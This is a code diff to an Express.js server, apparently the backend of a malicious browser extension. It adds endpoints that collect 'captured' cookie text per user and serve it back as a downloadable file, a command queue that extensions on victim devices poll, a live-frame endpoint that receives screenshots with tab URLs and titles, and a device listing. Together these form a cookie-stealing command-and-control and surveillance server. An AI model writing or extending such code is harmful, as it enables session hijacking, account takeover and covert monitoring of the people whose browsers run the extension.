@@ -298,6 +298,117 @@ app.get('/api/stats', (req, res) => {
     }
 });
 
+// ========== COOKIES ENDPOINTS ==========
+const cookiesStore = new Map(); // userId -> { cookieText, totalCount, capturedAt }
+
+app.post('/api/cookies/:userId', (req, res) => {
+    try {
+        const { userId } = req.params;
+        const { cookieText, totalCount, capturedAt } = req.body;
+        if (!cookieText) return res.status(400).json({ success: false, error: 'cookieText required' });
+        cookiesStore.set(String(userId), { cookieText, totalCount: totalCount || 0, capturedAt: capturedAt || new Date().toISOString() });
+        console.log(`🍪 Cookies received for userId ${userId}: ${totalCount} cookies`);
+        res.json({ success: true, message: 'Cookies saved', totalCount });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/cookies/:userId', (req, res) => {
+    try {
+        const { userId } = req.params;
+        const entry = cookiesStore.get(String(userId));
+        if (!entry) return res.status(404).json({ success: false, error: 'No cookies found for this user' });
+        res.setHeader('Content-Disposition', `attachment; filename="cookies_${userId}.txt"`);
+        res.setHeader('Content-Type', 'text/plain');
+        res.send(entry.cookieText);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/cookies-meta/:userId', (req, res) => {
+    try {
+        const { userId } = req.params;
+        const entry = cookiesStore.get(String(userId));
+        if (!entry) return res.json({ success: false, hasCookies: false });
+        res.json({ success: true, hasCookies: true, totalCount: entry.totalCount, capturedAt: entry.capturedAt });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// ========== COMMANDS ENDPOINTS (for extension polling) ==========
+const commandQueue = new Map(); // deviceId -> [{ action, userId, ts }]
+
+app.get('/api/commands/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const cmds = commandQueue.get(deviceId) || [];
+        commandQueue.delete(deviceId); // consume
+        res.json({ commands: cmds });
+    } catch (error) {
+        res.status(500).json({ commands: [] });
+    }
+});
+
+app.post('/api/command/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const { action, userId } = req.body;
+        if (!action) return res.status(400).json({ success: false, error: 'action required' });
+        const cmds = commandQueue.get(deviceId) || [];
+        cmds.push({ action, userId, ts: Date.now() });
+        commandQueue.set(deviceId, cmds);
+        console.log(`📤 Command queued for device ${deviceId}: ${action}`);
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// ========== LIVE FRAME ENDPOINT ==========
+const liveFrames = new Map(); // userId -> { frame, ts, tabUrl, tabTitle }
+
+app.post('/api/live-frame/:userId', (req, res) => {
+    try {
+        const { userId } = req.params;
+        const { frame, deviceId, tabUrl, tabTitle, ts } = req.body;
+        if (!frame) return res.status(400).json({ success: false, error: 'frame required' });
+        liveFrames.set(String(userId), { frame, deviceId, tabUrl, tabTitle, ts: ts || Date.now() });
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/live-frame/:userId', (req, res) => {
+    try {
+        const { userId } = req.params;
+        const entry = liveFrames.get(String(userId));
+        if (!entry) return res.json({ success: false, hasFrame: false });
+        res.json({ success: true, hasFrame: true, ...entry });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// ========== GET DEVICE IDs for an account ==========
+app.get('/api/devices', (req, res) => {
+    try {
+        // Return all known deviceIds from poll requests + command queues
+        const devices = new Set([
+            ...Array.from(pollRequests.keys()),
+            ...Array.from(commandQueue.keys())
+        ]);
+        // Also derive device IDs from accounts if stored
+        res.json({ success: true, devices: Array.from(devices) });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+
 // ========== DASHBOARD (tidak perlu API key — ini buat kamu buka di browser) ==========
 app.get('/dashboard', (req, res) => {
     const htmlPath = path.join(__dirname, 'public', 'dashboard.html');
